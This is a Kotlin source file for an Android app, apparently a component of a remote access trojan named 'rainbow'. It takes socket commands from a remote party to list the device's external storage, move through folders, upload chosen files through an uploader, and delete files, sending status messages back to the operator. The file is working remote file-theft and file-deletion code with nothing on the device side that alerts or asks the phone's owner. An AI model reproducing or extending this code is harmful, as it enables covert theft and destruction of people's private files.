package abyssalarmy.rainbow.RainbowHandler

import abyssalarmy.rainbow.RainbowNetwork.RainbowSocket
import abyssalarmy.rainbow.RainbowNetwork.RainbowUpload
import android.content.Context
import android.os.Environment
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

class RainbowFileExploreHandler(val context: Context, private val socket: RainbowSocket) {

    var currentPath: File = Environment.getExternalStorageDirectory()
    private val uploader = RainbowUpload(context)

    fun handle() {
        socket.addEventListener("file-explorer") {
            val data = FileExplorerData.getFileExplorerData(it)
            Log.i("FILE EXPLORER", it.toString())
            when (data.request) {
                "ls" -> onLs()
                "back" -> onBack()
                "cd" -> {
                    val name = data.extras["name"]
                    if (name != null) {
                        onCd(name)
                    }
                }
                "upload" -> {
                    val name = data.extras["name"]
                    if (name != null) {
                        onUpload(name)
                    }
                }
                "delete" -> {
                    val name = data.extras["name"]
                    if (name != null) {
                        onDelete(name)
                    }
                }
            }
        }
    }

    private fun onLs() {
        currentPath = Environment.getExternalStorageDirectory()
        val jsonData = JSONArray()
        if (currentPath.listFiles() != null) {
            for (file in currentPath.listFiles()!!) {
                val jsonObject = JSONObject()
                jsonObject.put("name", nameShorter(file.name))
                jsonObject.put("isFolder", file.isDirectory)
                jsonData.put(jsonObject)
                Log.i("FILE", file.name)
            }
            socket.sendFileExplorer(jsonData)
        }
    }

    private fun onCd(name: String) {
        if (currentPath.listFiles() != null) {
            for (file in currentPath.listFiles()!!) {
                if (file.name.contains(name)) {
                    currentPath = File(currentPath.path + "/${file.name}")
                }
            }
        }
        if (currentPath.exists()) {
            val jsonData = JSONArray()
            if (currentPath.listFiles() != null) {
                for (file in currentPath.listFiles()!!) {
                    val jsonObject = JSONObject()
                    jsonObject.put("name", nameShorter(file.name))
                    jsonObject.put("isFolder", file.isDirectory)
                    jsonData.put(jsonObject)
                    Log.i("FILE", file.name)
                }
                socket.sendFileExplorer(jsonData)
            }
        } else {
            onLs()
            socket.sendMessage("The path you selected dose not exist !")
        }
    }

    private fun onBack() {
        if (currentPath == Environment.getExternalStorageDirectory()) {
            socket.sendMessage("Your in root home directory")
        } else {
            if (currentPath.parent != null) {
                currentPath = currentPath.parentFile!!
                val jsonData = JSONArray()
                if (currentPath.listFiles() != null) {
                    for (file in currentPath.listFiles()!!) {
                        val jsonObject = JSONObject()
                        jsonObject.put("name", nameShorter(file.name))
                        jsonObject.put("isFolder", file.isDirectory)
                        jsonData.put(jsonObject)
                        Log.i("FILE", file.name)
                    }
                    socket.sendFileExplorer(jsonData)
                }
            } else {
                socket.sendMessage("Your in root home directory")
            }
        }
    }

    private fun onUpload(name: String) {
        if (currentPath.exists()) {
            for (file in currentPath.listFiles()!!) {
                if (file.isFile && file.name.contains(name)) {
                    socket.sendMessage("The device has started uploading the file, please be patient and don't change the path")
                    uploader.upload(file)
                }
            }
        }
    }

    private fun onDelete(name: String) {
        if (currentPath.exists()) {
            for (file in currentPath.listFiles()!!) {
                if (file.isFile && file.name.contains(name)) {
                    socket.sendMessage("File has been deleted !")
                    file.delete()
                }
            }
        }
    }

    private fun nameShorter(name: String): String {
        return if (name.length < 16) {
            name
        } else {
            name.substring(0, 15)
        }
    }

    private class FileExplorerData(
        val request: String,
        val extras: MutableMap<String, String>
    ) {
        companion object {
            fun getFileExplorerData(data: JSONObject): FileExplorerData {
                val request = data.getString("request")
                val extras = mutableMapOf<String, String>()
                val extrasArray = data.getJSONArray("extras")
                for (extraIndex in 0 until extrasArray.length()) {
                    val extra = extrasArray[extraIndex] as JSONObject
                    val key = extra.getString("key")
                    val value = extra.getString("value")
                    extras[key] = value
                }
                return FileExplorerData(request, extras)
            }
        }
    }
}